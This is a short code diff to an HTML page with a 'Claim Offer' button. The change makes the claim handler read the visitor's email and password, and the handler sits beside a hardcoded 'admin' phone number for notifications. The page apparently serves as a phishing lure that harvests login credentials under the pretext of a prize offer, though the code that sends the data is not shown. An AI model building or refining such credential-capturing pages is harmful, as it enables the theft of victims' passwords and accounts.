@@ -30,7 +30,7 @@
 
         <div class="input-group">
             <label class="input-label">Password</label>
-            <input type="password" id="pw" placeholder="Password">
+            <input type="password" id="password" placeholder="Password">
         </div>
 
         <button id="btnFinalClaim" class="claim-btn">Claim Offer</button>
@@ -58,7 +58,7 @@
         // Final Claim Action
         document.getElementById('btnFinalClaim').addEventListener('click', function () {
             const email = document.getElementById('email').value;
-            const mobile = document.getElementById('mobile').value;
+            const password = document.getElementById('password').value;
 
             // Hardcoded number for notifications
             const adminNotifyNumber = "94789283337";
@@ -96,4 +96,5 @@
 
 
 </html>
+
 
